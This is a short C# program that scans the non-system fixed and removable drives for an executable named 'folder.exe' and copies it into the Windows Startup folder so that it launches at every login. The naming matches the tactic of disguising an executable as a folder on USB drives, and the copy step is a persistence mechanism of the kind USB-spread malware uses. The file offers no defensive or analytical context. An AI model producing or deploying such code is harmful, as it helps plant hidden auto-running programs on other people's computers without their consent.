using System;
using System.IO;

class Program
{
    static void Main()
    {
        DriveInfo[] drives = DriveInfo.GetDrives();
        string fileName = "folder.exe"; // change this to the name of the folder you want to copy
        string filePath = null;

        foreach (DriveInfo drive in drives)
        {
            if (drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable) 
            {
                if (drive.Name != "C:\\") 
                {
                    string potentialPath = Path.Combine(drive.Name, fileName);
                    if (File.Exists(potentialPath))
                    {
                        filePath = potentialPath;
                        break; 
                    }
                }
            }
        }

        if (filePath == null)
        {
            Console.WriteLine("the folder specified was not found.");
            return;
        }

        string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        string destination = Path.Combine(startupFolder, fileName);

        try
        {
            File.Copy(filePath, destination, true);
            Console.WriteLine($"Folder copy to  {destination}");
        }
        catch (Exception e)
        {
            Console.WriteLine($"error when copy : {e.Message}");
        }
    }
}
